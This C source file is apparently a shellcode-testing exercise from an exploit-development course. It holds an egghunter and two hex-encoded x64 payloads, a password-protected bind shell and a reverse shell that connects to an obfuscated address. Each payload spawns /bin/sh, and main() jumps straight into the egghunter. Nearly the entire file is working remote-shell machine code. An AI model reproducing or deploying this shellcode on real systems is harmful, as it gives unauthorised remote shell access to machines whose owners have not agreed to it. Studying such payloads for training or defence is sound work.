#include <stdio.h>
#include <unistd.h>

#define PAYLOAD 0  // 0 - Bind shell; 1 - Reverse shell
#define EGG "SLAE" // must be 4byte

const unsigned char egghunter[] = \
  "\x8d\x05\x12\x00\x00\x00\xff\xc0\x67\x81\x78\xfc"
  EGG
  "\x75\xf4\xff\xe0";

const unsigned char bogus[] = \
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90\x90\x90\x90\x90";

#if PAYLOAD
const unsigned char payload[] = \
  EGG
  "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x31\xd2\x0f\x05\x50\x5f\x52\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x23\x07\x54\x5e\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x56\x31\xf6\x6a\x32\x58\x0f\x05\x5e\x52\x54\x5a\x6a\x2b\x58\x0f\x05\x5a\x50\x6a\x03\x58\x0f\x05\x5f\x31\xc0\x54\x5e\x0f\x05\x81\x3e\x37\x36\x39\x38\x75\x23\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x6a\x3b\x58\x0f\x05";

#else
const unsigned char payload[] = \
  EGG
  "\x6a\x29\x58\x6a\x02\x5f\x6a\x01"
  "\x5e\x48\x31\xd2\x0f\x05\x50\x5f"
  "\x52\x52\xc6\x04\x24\x02\x66\xc7"
  "\x44\x24\x02\x23\x07\xb8\xd5\xaa"
  "\xaa\xab\x35\xaa\xaa\xaa\xaa\x89"
  "\x44\x24\x04\x54\x5e\x6a\x10\x5a"
  "\x6a\x2a\x58\x0f\x05\x31\xc0\x0f"
  "\x05\x81\x3e\x37\x36\x39\x38\x75"
  "\x25\x6a\x03\x5e\x48\xff\xce\x6a"
  "\x21\x58\x0f\x05\x75\xf6\x48\x29"
  "\xd2\x52\x52\x5e\x48\xbf\x2f\x2f"
  "\x62\x69\x6e\x2f\x73\x68\x57\x54"
  "\x5f\x6a\x3b\x58\x0f\x05";
#endif

int main (int argc, char** argv)
{
  printf("Shellcode length: %d\n", sizeof(payload));
  printf("Egghunter length: %d\n", sizeof(egghunter));
  int (*p)() = (int(*)())egghunter;
  p();
}
